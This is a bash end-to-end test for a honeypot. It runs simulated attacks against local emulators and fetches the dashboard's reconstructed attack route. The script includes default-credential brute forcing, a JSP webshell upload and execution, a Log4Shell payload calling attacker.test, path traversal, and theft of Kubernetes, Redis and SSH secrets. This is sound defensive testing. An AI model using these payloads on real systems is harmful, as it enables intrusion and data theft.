#!/usr/bin/env bash
# End-to-end smoke test against a running stack (docker compose up).
# Drives the emulators like an attacker (recon -> exploit -> lateral movement ->
# data access) and then pulls the reconstructed route report from the operator
# dashboard. Slack alarms fire in the background if SLACK_WEBHOOK_URL is set.
set -uo pipefail

HOST="${HONEYPOT_HOST:-127.0.0.1}"
TOKEN="${DASHBOARD_TOKEN:-change-me-operator-token}"
DASHBOARD="http://127.0.0.1:9500"

step() { printf '\n\033[1;36m== %s\033[0m\n' "$1"; }

step "Recon: port/service sweep + tomcat fingerprint"
for port in 8080 8000 8443 8081 6379 6443; do
	curl -s -m 3 -o /dev/null "http://${HOST}:${port}/" 2>/dev/null || true
	curl -s -m 3 -k -o /dev/null "https://${HOST}:${port}/" 2>/dev/null || true
done
curl -s -m 3 "http://${HOST}:8080/" >/dev/null

step "Tomcat: manager brute force + default creds + JSP webshell upload + RCE"
for password in admin manager root tomcat; do
	curl -s -m 3 -o /dev/null -u "tomcat:${password}" "http://${HOST}:8080/manager/html"
done
curl -s -m 3 -X PUT --data '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' \
	"http://${HOST}:8080/payloads/shell.jsp" -o /dev/null
echo "  webshell whoami ->"
curl -s -m 3 "http://${HOST}:8080/payloads/shell.jsp?cmd=whoami"
curl -s -m 3 "http://${HOST}:8080/payloads/shell.jsp?cmd=cat%20/opt/payments/.env" -o /dev/null

step "Tomcat: Log4Shell + path traversal probes"
curl -s -m 3 -o /dev/null -H 'User-Agent: ${jndi:ldap://attacker.test/a}' "http://${HOST}:8080/"
curl -s -m 3 -o /dev/null "http://${HOST}:8080/static/../../etc/passwd"

step "Payments API: enumerate accounts + cardholder data (IDOR/exfil)"
curl -s -m 3 -k -H 'Authorization: Bearer stolen-token' "https://${HOST}:8443/v1/accounts" -o /dev/null
curl -s -m 3 -k "https://${HOST}:8443/v1/cards" -o /dev/null
curl -s -m 3 -k "https://${HOST}:8443/v1/accounts/acct_anything/transactions" -o /dev/null

step "Kubernetes: anonymous API access + secret theft"
curl -s -m 3 -k "https://${HOST}:6443/version" -o /dev/null
curl -s -m 3 -k "https://${HOST}:6443/api/v1/namespaces/payments/secrets" -o /dev/null

step "Admin portal: default credential login -> internal network map"
curl -s -m 3 -c /tmp/honeypot_cookies -d 'username=admin&password=admin123' "http://${HOST}:8081/login" -o /dev/null
curl -s -m 3 -b /tmp/honeypot_cookies "http://${HOST}:8081/dashboard" -o /dev/null

step "Redis: unauthenticated key dump"
if command -v redis-cli >/dev/null 2>&1; then
	redis-cli -h "${HOST}" -p 6379 KEYS '*' >/dev/null 2>&1 || true
	redis-cli -h "${HOST}" -p 6379 GET config:stripe_api_key >/dev/null 2>&1 || true
else
	exec 3<>"/dev/tcp/${HOST}/6379" && printf 'PING\r\nKEYS *\r\nGET config:stripe_api_key\r\nQUIT\r\n' >&3 && timeout 2 cat <&3 >/dev/null; exec 3>&- 2>/dev/null || true
fi

step "SSH: weak credential login + jailed shell (optional, needs sshpass)"
if command -v sshpass >/dev/null 2>&1; then
	sshpass -p root ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 root@"${HOST}" \
		'whoami; cat /opt/payments/exports/cardholder_data.csv | head -3; kubectl get secrets -n payments' 2>/dev/null || true
else
	echo "  (skipped: install sshpass to exercise the SSH jailed shell)"
fi

step "Waiting for collector to ingest + correlate"
sleep 6

step "Operator dashboard: sessions"
curl -s "${DASHBOARD}/api/sessions?token=${TOKEN}" || echo "  dashboard unreachable (is the stack up and token correct?)"

SESSION="$(curl -s "${DASHBOARD}/api/sessions?token=${TOKEN}" | sed -n 's/.*"id": *"\([^"]*\)".*/\1/p' | head -1)"
if [[ -n "${SESSION}" ]]; then
	step "Reconstructed attack route (session ${SESSION})"
	curl -s "${DASHBOARD}/api/report?format=md&session=${SESSION}&token=${TOKEN}"
else
	echo "No session recorded yet; check 'docker compose logs collector'."
fi
echo
